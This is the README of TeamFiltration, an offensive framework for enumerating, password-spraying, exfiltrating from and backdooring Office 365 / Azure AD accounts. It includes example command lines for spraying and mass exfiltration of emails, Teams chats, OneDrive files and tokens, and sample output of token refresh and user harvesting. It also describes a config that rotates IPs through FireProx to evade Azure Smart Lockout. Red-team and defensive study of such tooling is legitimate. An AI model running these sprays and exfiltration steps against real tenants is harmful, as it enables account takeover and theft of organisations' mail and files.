## TeamFiltration 
TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts.
**See the [Example Attack flow](#example-attack-flow) at the bottom of this readme for a general introduction into how TeamFiltration works!**

This tool has been used internally since January 2021 and was publicly released in my talk "Taking a Dumb In The Cloud" during DefCON30.

You will need to provide a json config file to be able to use TeamFiltration. This configuration file contains information such as PushoverAPI keys, Dehashed API keys, Fireprox endpoints URL and much more. Please see the [guide further down](#TeamFiltration-Configruation) on how to create your own config.

## Download
[You can download the latest precompiled release for Linux, Windows and MacOSX X64 ](https://github.com/Flangvik/TeamFiltration/releases/latest)   

**The releases are precompiled into a single application-dependent binary. The size go up, but you do not need DotNetCore or any other dependencies to run them.**

## FAQ

- You cannot run multiple instances of TeamFiltration with the same --outpath, this will cause a LiteDB file write collision!
- --outpath is mandatory and needs to be supplied for each module
- --outpath is client specific across all modules
- --outpath IS A FOLDER PATH, not a file.
- Question or bug? Hit me up on Twitter or create an issue
- In order to use the --validate-teams enumeration method you need to provide a sacrificial Office 365 user account. This account cannot have MFA enforced and must be joined in AAD with an valid Basic license. (sacrificialO365Username and sacrificialO365Password in the config file)
## Usage

```

  ╓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╖
 ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬┤                              ╟╬╬╜╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬╡                              │      ╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬╡                              ││      ╙╬╬╜╘ └╙╜╬╬╬╬╬╬
╬╬╬╬╡         ╓╥╥╬╬╬╬╬╬╥╥╖         ││       │        ╬╬╬╬╬
╬╬╬╬╡     ╓╬╫╬╜╜┘      ╙╜╜╬╫╬┐     ││       ││       └╬╬╬╬
╬╬╬╬┤    ╬╬╜╙╩╬╖╓          ╙╬╬╬    ││       ││        ╬╬╬╬
╬╬╬╬┤   ╬╜      ╙╬╫╖╖ ╓      ╙╬╖   ││      ├││        ╬╬╬╬
╬╬╬╬┤  ╬╬     ╓╖   ╙╬╬╬╬╬╬╦    ╬╬  │┌    ╓╬┤││       ╓╬╬╬╬
╬╬╬╬┤ ╓╬┤     ╬╬╬   ╬╬╬╬╬╬╬╬╜╜╜╬╬╖ ╟╬╬╬╬╬╬╬╬╬╕      ┌╬╬╬╬╬
╬╬╬╬┤ ╬╬┤     ╙╩┘   ╙╬╬╬╬╬╩    ╟╬╬ ╙╜╜╜╜╜╜╜╜╜╬╬╖╖╖╦╬╬╬╬╬╬╬
╬╬╬╬┤ ╬╬┤                      ╟╬╬ ││         ╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬┤  ╬╬   ╦╖            ╗╖   ╬╬  ││         │       ╬╬╬╬
╬╬╬╬┤  └╬┐   ╙╬╖╖      ╓╬╬╜   ╓╬┘  ││         │       ╬╬╬╬
╬╬╬╬┤   └╬╖    ╙╩╨╬╬╬╩╨╜╜   ╒╬╬    ││         │       ╬╬╬╬
╬╬╬╬┤    ╙╬╬╬╖           ┌╖╫╬╜┘    ││         │       ╬╬╬╬
╬╬╬╬┤       ╙╩╬╬╬╥╥╥╥╥╥╫╬╬╜╜       ││         │       ╬╬╬╬
╬╬╬╬┤            ╙╙╜╜╜╛            ││         │       ╬╬╬╬
╬╬╬╬┤                              ││         │    ╓╖╬╬╬╬╬
╬╬╬╬┤                              ││         ╬╦╦╬╬╬╬╬╬╬╬╬
╬╬╬╬┤                              ││     ╓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬┤                              ╬╬╬╖╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬
 └╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╜
   ╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜╜

[] TeamFiltration V0.3.3.7 PUBLIC, created by @Flangvik @TrustedSec
Usage:

   --outpath     Output path to store database and exfiltrated information (Needed for all modules)

   --config      Local path to your TeamFiltration.json configuration file, if not provided will load from the current path

   --exfil       Load the exfiltration module  

         --username            Override to target a given username that does not exist in the database
         --password            Override to target a given password that does not exist in the database
         --cookie-dump         Override to target a given account using it's refresk-cookie-collection

         --all                 Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)
         --aad                 Exfiltrate information from Graph API (domain users and groups)
         --teams               Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)
         --onedrive            Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the users entire OneDrive directory)
         --owa                 Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received) 
               --owa-limit     Set the max amount of emails to exfiltrate, default is 2k.
         --jwt-tokens              Exfiltrate JSON formated JTW-tokens for SSO resources (MsGraph,AdGraph, Outlook, SharePoint, OneDrive, Teams)

   --spray       Load the spraying module

         --aad-sso             Use SecureWorks recent Azure Active Directory password brute-forcing vuln for spraying
         --us-cloud            When spraying companies attached to US Tenants (https://login.microsoftonline.us/)
         --time-window         Defines a time windows where spraying should accour, in the military time format <12:00-19:00>
         --passwords           Path to a list of passwords, common weak-passwords will be generated if not supplied
         --seasons-only        Password generated for spraying will only be based on seasons
         --months-only         Password generated for spraying will only be based on months
         --common-only         Spray with the top 20 most common passwords
         --combo               Path to a combolist of username:password
         --exclude              Path to a list of emails to exclude from spraying

         --sleep-min           Minimum minutes to sleep between each full rotation of spraying default=60
         --sleep-max           Maximum minutes to sleep between each full rotation of spraying default=100
         --delay               Delay in seconds between each individual authentication attempt. default=0
         --push                Get Pushover notifications when valid credentials are found (requires pushover keys in config)
         --push-locked         Get Pushover notifications when an sprayed account gets locked (requires pushover keys in config)
         --force               Force the spraying to proceed even if there is less the <sleep> time since the last attempt

   --enum        Load the enumeration module

         --domain              Domain to perfom enumeration against, names pulled from statistically-likely-usernames if not provided with --usernames
         --usernames           Path to a list of usernames to enumerate (emails)
         --dehashed            Use the dehashed submodule in order to enumerate emails from a basedomain
         --validate-msol       Validate that the given o365 accounts exists using the public GetCredentialType method (Very RateLimited - Slow 20 e/s)
         --validate-teams      Validate that the given o365 accounts exists using the Teams API method (Recommended - Super Fast 300 e/s)
         --validate-login      Validate that the given o365 accounts by attemping to login (Noisy - triggers logins - Fast 100 e/s)

   --backdoor        Loads the interactive backdoor module

   --database        Loads the interactive database browser module

   --debug           Add burp as a proxy on 127.0.0.1:8080

   Examples:

        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --sleep-min 120 --sleep-max 200 --push
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --push-locked --months-only --exclude C:\Clients\2021\FooBar\Exclude_Emails.txt
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --spray --passwords C:\Clients\2021\FooBar\Generic\Passwords.txt --time-window 13:00-22:00
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --all 
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --aad  
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --exfil --teams --owa --owa-limit 5000
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --debug --exfil --onedrive
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --enum --validate-teams
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --backdoor
        --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --database
```

With a set of valid credentials found, we can move into the exfil module. The valid credentials and account information is stored in the teamfiltration database, so you do not need to provide them when using the --exfil module.

```
 TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --exfil --aad
```

This will attempt to bypass any MFA, and if successful, exfiltrate information from resources accessible within o365. The --aad or Azure Active Directory plugin will attempt to exfiltrate all users, groups, and domains from the o365 tenant. All new users will automatically be added to the database as valid users. 

```
[♥] TeamFiltration V0.3.2.6, created by @Flangvik
[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --exfil --aad
[+] You can select multiple users using syntax 1,2,3 or 1-3
    |-> 0 - thomas.anderson@legitcorp.net
    |-> ALL - Everyone!

[?] What user to target ? #> 0
[EXFIL] 24.05.2021 12:35:43 EST Attempting to exfiltrate using provided token
[EXFIL] 24.05.2021 12:35:44 EST Refreshed a token for => https://outlook.office365.com
[EXFIL] 24.05.2021 12:35:45 EST Refreshed a token for => https://api.spaces.skype.com
[EXFIL] 24.05.2021 12:35:45 EST Cross-resource-refresh allowed, we can exfil all that things!
[EXFIL] 24.05.2021 12:35:53 EST Refreshed a token for => https://graph.windows.net
[EXFIL] 24.05.2021 12:35:54 EST Refreshed a token for => https://graph.microsoft.com
[EXFIL] 24.05.2021 12:35:54 EST Exfiltrating AAD users and groups via MS AD Graph API
[EXFIL] 24.05.2021 12:35:58 EST Exfiltrating AAD users and groups via MS graph API
[EXFIL] 24.05.2021 12:35:59 EST Got 133 AAD users, appending to database as valid users!
```
With those new valid accounts added, we can go back to the spraying module and successfully hit all the accounts in the domain.

You can also exfiltrate Emails + Attachments, OneDrive files, Teams Chat Logs + Attachments, and raw JWT tokens using different exfil plugins as shown in the --help menu.
```
         --all                 Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)
         --aad                 Exfiltrate information from Graph API (domain users and groups)
         --teams               Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)
         --onedrive            Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the users entire OneDrive directory)
         --owa                 Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)
               --owa-limit     Set the max amount of emails to exfiltrate, default is 2k.
         --tokens              Exfiltrate JSON formated JTW-tokens for SSO resources (MsGraph,AdGraph, Outlook, SharePoint, OneDrive, Teams)
```

## TeamFiltration Configuration

Below is an example TeamFiltration config file, the configuration file needs to be supplied everytime you run TeamFiltration, using the --config argument.
```
{
    "pushoverAppKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "pushoverUserKey": "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    "msolFireProxEndpointsUs": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/common/oauth2/token","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token"],
    "msolFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/common/oauth2/token","https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/common/oauth2/token"],
    "teamsEnumFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox/","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox/"],
    "aadSSoFireProxEndpoints": ["https://XXXXAAAA.execute-api.us-east-1.amazonaws.com/fireprox","https://XXXXAAAA.execute-api.us-west-1.amazonaws.com/fireprox"],
    "sacrificialO365Username": "mr.andersen@matrix.com",
    "sacrificialO365Passwords": "TheChooenOne123!",
      "dehashedApiKey": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 
	"dehashedEmail" : "bruce.wayne@batcave.com",
    "proxyEndpoint": "http://127.0.0.1:8080"
  }
  ```

  `pushoverAppKey`
  This is your Pushover Application Token / API Token (Optional).

  `pushoverUserKey`
  This is your Pushover Application  User Key / User Token (Optional).

  `msolFireProxEndpointsUs`
  An string array of fireprox endpoints generated to be pointing at -> `https://login.microsoftonline.us/`

  `msolFireProxEndpoints`
  An string array of fireprox endpoints generated to be pointing at -> `https://login.microsoftonline.com/`

  `teamsEnumFireProxEndpoints`
  An string array of fireprox endpoints generated to be pointing at -> `https://teams.microsoft.com/api/mt/`

  `aadSSoFireProxEndpoints`
  An string array of fireprox endpoints generated to be pointing at -> `https://autologon.microsoftazuread-sso.com/` (Optional).

  `sacrificialO365Username`
 The username / email for the sacrificial Office365 account used for perfoming enumeration using the Teams API method. (Optional, but cannot have MFA / Conditional access enabled, dohh)

  `sacrificialO365Passwords`
 The password for the sacrificial Office365 account used for perfoming enumeration using the Teams API method. (Optional).

  `dehashedApiKey`
  Your Dehashed API key for auth (Optional).

  `dehashedEmail`
   Your Dehashed Account Email key for auth (Optional).

  `proxyEndpoint`
  HTTP endpoint used for inspecting traffic / debugging purposes, eg Burp,MitMProxy etc.



### Generate FireProx URLs
TeamFiltration heavily uses FireProx url in order to slow Azure Smart Lockout down, the more URL's the better.
Follow the instructions below in order to generate FireProx URL's for your own Config

```
git clone https://github.com/ustayready/fireprox
cd fireprox
```

Add [create_fireprox_instances.sh](https://github.com/Flangvik/TeamFiltration/blob/main/create_fireprox_instances.sh) inside the folder!

Fill in our AWS access keys and run the script, the bash script will output the JSON FireProx portion for your config, simply copy and paste! :)  

## Credits

- [GitHub - KoenZomers/OneDriveAPI: API in .NET to communicate with OneDrive Personal and OneDrive for Business](https://github.com/KoenZomers/OneDriveAPI)
- [Research into Undocumented Behavior of Azure AD Refresh Tokens ](https://github.com/secureworks/family-of-client-ids-research) 
- [WS API Gateway management tool for creating on the fly HTTP pass-through proxies for unique IP rotation](https://github.com/ustayready/fireprox)
- Credits to [Ryan] (https://twitter.com/detectdotdev) for validating and discussing my observations / questions!
- The entire [TrustedSec](https://TrustedSec.com) team for helping me polish this tool! 

